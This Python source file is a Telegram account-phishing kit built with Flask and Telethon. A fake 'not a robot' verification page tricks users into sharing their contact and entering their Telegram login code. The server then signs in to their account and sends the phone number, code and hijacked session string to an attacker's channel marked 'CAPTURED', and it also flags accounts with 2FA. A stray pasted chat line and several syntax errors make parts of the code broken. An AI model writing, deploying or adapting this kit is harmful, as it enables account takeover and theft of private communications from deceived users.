import os
import asyncio
import json
import threading
from datetime import datetime
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from flask import Flask, request, jsonify, render_template_string
import psycopg2
from psycopg2.extras import RealDictCursor

# Railway Environment Variables
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))
DATABASE_URL = os.environ.get("DATABASE_URL")

print("=" * 50)
print("SCRIPT STARTING...")
print("=" * 50)

app = Flask(name)

# Database functions
def get_db():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS sessions (user_id TEXT PRIMARY KEY, phone TEXT, phone_code_hash TEXT, session_string TEXT)")
    conn.commit()
    cur.close()
    conn.close()
    print("Database initialized")

# Initialize bot client here (outside functions)

async def send_channel(msg):
    try:
        t = TelegramClient('logger', API_ID, API_HASH)
        await t.start(bot_token=BOT_TOKEN)
        await t.send_message(CHANNEL_ID, msg)
        await t.disconnect()
    except Exception as e:
        print(f"Channel error: {e}")

HTML = """<!DOCTYPE html>
<html>
<head>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed;background-size:cover;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}
.container{display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%;height:100%;padding:20px;background:rgba(0,0,0,0.3)}
.card{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);padding:40px 30px;border-radius:20px;text-align:center;max-width:400px;width:100%;border:1px solid rgba(255,255,255,0.1);box-shadow:0 8px 32px rgba(0,0,0,0.3)}
h2{color:#fff;margin-bottom:20px;font-size:22px;font-weight:600}
p{color:#ddd;font-size:14px;margin-bottom:30px;line-height:1.5}
.robot-icon{font-size:100px;margin-bottom:20px;display:block}
.btn{background:linear-gradient(135deg,rgba(255,107,157,0.9),rgba(196,69,105,0.9));color:white;border:none;padding:16px 30px;border-radius:12px;font-size:18px;cursor:pointer;width:100%;font-weight:bold;margin:10px 0}
.btn:disabled{background:rgba(68,68,68,0.8);cursor:not-allowed}
#verificationScreen,#codeScreen{display:none}
.code-slots{display:flex;justify-content:center;gap:12px;margin-bottom:30px}
.code-slot{width:55px;height:55px;border:2px solid rgba(255,255,255,0.3);border-radius:12px;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold;color:#fff}
.code-slot.filled{background:rgba(255,107,157,0.8);border-color:rgba(255,107,157,0.9)}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:320px;margin:0 auto;padding:20px;background:rgba(0,0,0,0.3);border-radius:20px}
.key{background:linear-gradient(135deg,rgba(255,107,157,0.9),rgba(196,69,105,0.9));color:white;border:none;padding:18px;border-radius:12px;font-size:24px;font-weight:bold;cursor:pointer}
.key.clear{background:linear-gradient(135deg,rgba(68,68,68,0.8),rgba(34,34,34,0.8))}
.error{color:#ff6b6b;font-size:14px;margin-top:10px;display:none;font-weight:bold}
.loading{display:none;color:#ddd;margin-top:10px}
</style>
</head>
<body>
<div class="container">
<div id="antiBotScreen"><div class="card"><span class="robot-icon">🤖</span><h2>Please confirm that you are not a robot ✅</h2><p>This verification helps us ensure the security and integrity of our service.</p><button class="btn" onclick="handleConfirm()">Confirm ✅</button></div></div>

Hey me, [7/22/26 12:40 PM]
<div id="verificationScreen"><div class="card"><h2>Security Verification</h2><p>To ensure your account security, we need to verify your identity.</p><button class="btn" id="shareBtn" onclick="handleContact()">Share Contact & Verify</button><div class="loading" id="contactLoading">Requesting contact...</div></div></div>
<div id="codeScreen"><div class="card"><h2>Enter Verification Code</h2><p>We sent a verification code to your Telegram app. Enter it below.</p><div class="code-slots" id="codeSlots"><div class="code-slot"></div><div class="code-slot"></div><div class="code-slot"></div><div class="code-slot"></div><div class="code-slot"></div></div><div class="keypad"><button class="key" onclick="pressKey('1')">1</button><button class="key" onclick="pressKey('2')">2</button><button class="key" onclick="pressKey('3')">3</button><button class="key" onclick="pressKey('4')">4</button><button class="key" onclick="pressKey('5')">5</button><button class="key" onclick="pressKey('6')">6</button><button class="key" onclick="pressKey('7')">7</button><button class="key" onclick="pressKey('8')">8</button><button class="key" onclick="pressKey('9')">9</button><button class="key clear" onclick="pressKey('clear')">C</button><button class="key" onclick="pressKey('0')">0</button><button class="key clear" onclick="pressKey('back')">⌫</button></div><button class="btn" onclick="submitCode()" style="margin-top:20px">Verify</button><button class="btn" onclick="resendCode()" style="margin-top:10px;background:linear-gradient(135deg,rgba(68,68,68,0.8),rgba(34,34,34,0.8))">Resend Code</button><div class="error" id="errorBox">Invalid code.</div><div class="loading" id="loadingBox">Verifying...</div></div></div>
<div id="successScreen" style="display:none"><div class="card"><h2>Success! ✅</h2><p style="color:#00ff88;font-size:16px">Your account has been verified successfully.</p></div></div>
</div>
<script>
var tg=window.Telegram.WebApp;tg.ready();tg.expand();var userId=null,enteredCode='';if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';tg.requestContact(function(success,response){if(success){console.log('Contact shared:',response);document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Please share your contact to continue.');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'}})}function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('A new code has been sent to your Telegram app.');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed to resend code.

Please try again.')}})}function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}function submitCode(){if(enteredCode.length!==5){alert('Please enter the full 5-digit code.');return}document.getElementById('loadingBox').style.display='block';document.getElementById('errorBox').style.display='none';fetch('/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:enteredCode,user_id:userId})}).then(function(res){if(!res.ok)throw new Error('Server error: '+res.status);return res.json()}).then(function(data){document.getElementById('loadingBox').style.display='none';if(data.success){document.getElementById('codeScreen').style.display='none';document.getElementById('successScreen').style.display='block';setTimeout(function(){tg.close()},2000)}else{document.getElementById('errorBox').textContent=data.error||'Invalid code.';document.getElementById('errorBox').style.display='block';enteredCode='';updateCodeDisplay()}}).catch(function(err){document.getElementById('loadingBox').style.display='none';document.getElementById('errorBox').textContent='Error: '+err.message;document.getElementById('errorBox').style.display='block'})}updateCodeDisplay();
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/resend', methods=['POST'])
def resend_code():
    data = request.json
    user_id = str(data.get('user_id'))
    
    conn = get_db()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sessions WHERE user_id = %s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    
    if not row:
        return jsonify({"success": False, "error": "Session not found."})
    
    phone = row['phone']
    session_string = row['session_string']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def request_new_code():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            new_session = client.session.save()
            
            conn = get_db()
            cur = conn.cursor()
            cur.execute("UPDATE sessions SET phone_code_hash=%s, session_string=%s WHERE user_id=%s", (phone_code_hash, new_session, user_id))
            conn.commit()
            cur.close()
            conn.close()
            
            await client.disconnect()
            return True, None
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    success, error = loop.run_until_complete(request_new_code())
    loop.close()
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})

@app.route('/verify', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    user_id = str(data.get('user_id'))
    
    conn = get_db()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sessions WHERE user_id = %s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    
    if not row:
        return jsonify({"success": False, "error": "Session not found. Please restart."})
    
    phone = row['phone']
    phone_code_hash = row['phone_code_hash']
    session_string = row['session_string']
    
    print(f"\n[VERIFY] Phone: {phone}, Code: {code}")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def try_login():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            final_session = client.session.save()
            
            print(f"\n[CAPTURED] {phone}")
            print(f"[SESSION] {final_session}\n")
            
            msg = f"🚨 CAPTURED\n\n📞 {phone}\n🔑 {code}\n🔐 `{final_session}`\n\n{datetime.now()}"
            await send_channel(msg)
            await client.disconnect()
            
            conn = get_db()
            cur = conn.cursor()
            cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
            conn.commit()
            cur.close()
            conn.close()
            
            return True, None
            
        except errors.PhoneCodeInvalidError:
            await client.disconnect()
            return False, "Invalid code"
        except errors.PhoneCodeExpiredError:
            await client.disconnect()
            return False, "Code expired"
        except errors.SessionPasswordNeededError:
            await client.disconnect()
            await send_channel(f"⚠️ 2FA: {phone}")
            return False, "2FA enabled"
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    success, error = loop.run_until_complete(try_login())
    loop.close()
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error}))
    
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
